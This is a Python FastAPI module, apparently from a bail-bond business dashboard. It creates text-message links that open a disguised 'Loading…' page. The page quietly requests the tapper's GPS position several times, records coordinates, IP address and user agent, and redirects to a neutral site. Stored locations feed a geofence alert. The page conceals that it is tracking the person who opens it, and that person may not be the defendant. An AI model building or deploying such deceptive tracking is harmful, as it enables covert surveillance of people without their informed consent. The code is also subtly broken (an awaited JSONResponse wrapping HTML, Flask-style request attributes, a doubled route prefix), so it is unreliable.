from __future__ import annotations
from fastapi import APIRouter, Request
from fastapi.responses import JSONResponse
"""
Geo-Link Blueprint — Silent Location Capture
Generates one-time tracking tokens embedded in outbound texts.
When recipient taps the link, browser submits GPS coordinates silently
and redirects to a neutral page. Authorized by signed bond paperwork.
"""

import os
import uuid
import secrets
import math
import logging
from datetime import datetime, timezone, timedelta
from dashboard.extensions import get_collection
from dashboard.deps import get_settings

logger = logging.getLogger(__name__)
geo_bp = APIRouter(prefix="/api", tags=["geo"])
def haversine_distance(lat1, lon1, lat2, lon2):
    """Calculate distance in miles between two points."""
    R = 3958.8  # Earth radius in miles
    dlat = math.radians(lat2 - lat1)
    dlon = math.radians(lon2 - lon1)
    a = math.sin(dlat/2) * math.sin(dlat/2) + math.cos(math.radians(lat1)) \
        * math.cos(math.radians(lat2)) * math.sin(dlon/2) * math.sin(dlon/2)
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
    return R * c

def _get_public_url() -> str:
    """Return the branded public URL for geo links, falling back to env var."""
    settings = get_settings()
    url = settings.dashboard_public_url
    return url.rstrip("/") if url else ""

_REDIRECT_AFTER = os.getenv("GEO_REDIRECT_URL", "https://www.shamrockbailbonds.biz")
_TOKEN_TTL_HOURS = int(os.getenv("GEO_TOKEN_TTL_HOURS", "72"))

@geo_bp.post("/geo/link")
async def geo_create_link(request: Request):
    geo_pings = get_collection("geo_pings")
    data = await request.json() or {}

    token = secrets.token_urlsafe(12)
    expires_at = datetime.now(timezone.utc) + timedelta(hours=_TOKEN_TTL_HOURS)

    doc = {
        "token": token,
        "phone": data.get("phone", ""),
        "booking_number": data.get("booking_number", ""),
        "defendant_name": data.get("defendant_name", ""),
        "county": data.get("county", ""),
        "recipient_label": data.get("recipient_label", "Unknown"),
        "agent_name": data.get("agent_name", ""),
        "created_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": expires_at.isoformat(),
        "pings": [],
        "ping_count": 0,
        "status": "pending",
    }
    await geo_pings.insert_one(doc)

    public_url = _get_public_url()
    short_url = f"{public_url}/g/{token}" if public_url else f"/g/{token}"
    return {"token": token, "url": short_url}

@geo_bp.get("/g/{token}")
async def geo_capture_page(token: str):
    """
    Serve the silent GPS capture page.
    Requests geolocation multiple times (stream) to get better accuracy,
    POSTs coordinates back, then redirects to a neutral URL.
    """
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Shamrock Bail Bonds</title>
<style>body{{margin:0;background:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#555;font-size:14px}}</style>
</head>
<body>
<p>Loading&hellip;</p>
<script>
(function(){{
  var token = {token!r};
  var redirect = {_REDIRECT_AFTER!r};
  var pingsSent = 0;
  var maxPings = 3;
  var watchId = null;
  var timeoutId = null;

  function done(){{ 
    if(watchId) navigator.geolocation.clearWatch(watchId);
    if(timeoutId) clearTimeout(timeoutId);
    window.location.replace(redirect); 
  }}

  function send(lat,lng,acc,source){{
    try{{
      var x=new XMLHttpRequest();
      x.open('POST','/g/'+token+'/ping',true);
      x.setRequestHeader('Content-Type','application/json');
      x.onloadend = function() {{
        pingsSent++;
        if(pingsSent >= maxPings) done();
      }};
      x.onerror = function() {{
        pingsSent++;
        if(pingsSent >= maxPings) done();
      }};
      x.send(JSON.stringify({{lat:lat,lng:lng,accuracy:acc,source:source}}));
    }}catch(e){{done();}}
  }}

  if(navigator.geolocation){{
    // Fallback timeout in case GPS takes too long
    timeoutId = setTimeout(function() {{
      if(pingsSent === 0) {{
        // Send IP fallback ping
        send(null, null, null, 'ip_fallback');
      }} else {{
        done();
      }}
    }}, 8000);

    watchId = navigator.geolocation.watchPosition(
      function(p){{
        var source = p.coords.accuracy < 100 ? 'gps' : 'network';
        send(p.coords.latitude, p.coords.longitude, p.coords.accuracy, source);
      }},
      function(err){{
        if(pingsSent === 0) send(null, null, null, 'ip_fallback');
        else done();
      }},
      {{timeout:5000,maximumAge:0,enableHighAccuracy:true}}
    );
  }}else{{
    send(null, null, null, 'ip_fallback');
  }}
}})();
</script>
</body>
</html>"""
    resp = await JSONResponse(html)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp

@geo_bp.post("/g/{token}/ping")
async def geo_receive_ping(request: Request, token: str):
    geo_pings = get_collection("geo_pings")
    active_bonds = get_collection("active_bonds")

    data = await request.json() or {}
    lat = data.get("lat")
    lng = data.get("lng")
    accuracy = data.get("accuracy")
    source = data.get("source", "unknown")

    now = datetime.now(timezone.utc).isoformat()
    ip_addr = request.headers.get("X-Forwarded-For", request.remote_addr or "")
    
    # If IP fallback, we could do a free IP-geo lookup here, but for now just record it
    if source == 'ip_fallback' or lat is None or lng is None:
        lat = None
        lng = None
        accuracy = None

    ping_entry = {
        "lat": lat,
        "lng": lng,
        "accuracy": accuracy,
        "source": source,
        "ts": now,
        "ip": ip_addr,
        "ua": request.headers.get("User-Agent", ""),
    }

    result = await geo_pings.update_one(
        {"token": token, "status": {"$in": ["pending", "captured"]}},
        {
            "$push": {"pings": ping_entry},
            "$inc": {"ping_count": 1},
            "$set": {
                "status": "captured",
                "last_ping": now,
                "last_lat": lat,
                "last_lng": lng,
            },
        },
    )

    if result.matched_count == 0:
        return JSONResponse({"ok": False, "reason": "token_not_found_or_expired"}, status_code=404)

    record = await geo_pings.find_one({"token": token}, {"booking_number": 1, "phone": 1, "defendant_name": 1})
    booking_number = record.get("booking_number") if record else None

    if booking_number and lat is not None and lng is not None:
        location_entry = {
            "lat": lat,
            "lng": lng,
            "accuracy": accuracy,
            "source": source,
            "ts": now,
        }
        
        bond = await active_bonds.find_one({"booking_number": booking_number})
        if bond:
            await active_bonds.update_one(
                {"booking_number": booking_number},
                {
                    "$push": {"location_history": location_entry},
                    "$set": {
                        "latest_location": location_entry,
                        "last_geo_ping": now,
                    },
                },
            )
            
            # Geofence check
            geofence = bond.get("geofence")
            if geofence and geofence.get("center_lat") and geofence.get("center_lng"):
                try:
                    dist = haversine_distance(
                        float(lat), float(lng),
                        float(geofence["center_lat"]), float(geofence["center_lng"])
                    )
                    radius = float(geofence.get("radius_miles", 50))
                    if dist > radius:
                        # Breach detected!
                        logger.warning(f"[geofence] Breach detected for {booking_number}. Dist: {dist:.1f} > {radius}")
                        from dashboard.services.telegram_service import get_telegram_service
                        tg = get_telegram_service()
                        def_name = record.get("defendant_name") or bond.get("defendant_name", "Defendant")
                        alert_msg = (
                            f"🚨 GEOFENCE BREACH 🚨\n"
                            f"Defendant: {def_name}\n"
                            f"Booking: {booking_number}\n"
                            f"Distance: {dist:.1f} miles from center (Limit: {radius}m)\n"
                            f"Accuracy: {accuracy}m ({source})\n"
                            f"Time: {now}"
                        )
                        await tg.send_staff_alert(alert_msg)
                except Exception as e:
                    logger.error(f"[geofence] Error checking geofence for {booking_number}: {e}")

        defendants = get_collection("defendants")
        await defendants.update_one(
            {"arrest_ids": {"$elemMatch": {"booking_number": booking_number}}},
            {
                "$push": {"location_history": {"$each": [location_entry], "$slice": -50}},
                "$set": {
                    "latest_location": location_entry,
                    "last_geo_ping": now,
                },
            },
        )

    return {"ok": True}

@geo_bp.get("/api/geo/pings/{booking_number}")
async def geo_get_pings(booking_number: str):
    geo_pings = get_collection("geo_pings")
    cursor = geo_pings.find(
        {"booking_number": booking_number},
        {"_id": 0, "token": 0},
    ).sort("created_at", -1).limit(100)
    docs = []
    async for doc in cursor:
        docs.append(doc)
    return {"pings": docs, "count": len(docs)}
